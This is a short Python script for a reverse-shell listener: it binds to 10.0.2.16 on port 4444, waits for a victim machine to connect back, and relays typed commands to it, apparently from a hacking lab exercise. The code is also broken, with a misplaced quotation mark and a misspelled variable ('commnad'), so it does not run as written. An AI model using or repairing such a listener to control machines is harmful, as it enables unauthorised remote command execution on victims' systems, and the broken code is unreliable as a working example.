import socket

listener = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1)
listener.bind(("10.0.2.16" , 4444))
listener.listen(0)
print("\n[+] Waiting for incoming connection")
connection , address = listener.accept()
print( "\n [+] Connection Received from " + " str(address) )

while True : 
	commnad = input(">> ")
	connection.send(command)
	result = connection.recv(1024)
	print(result)




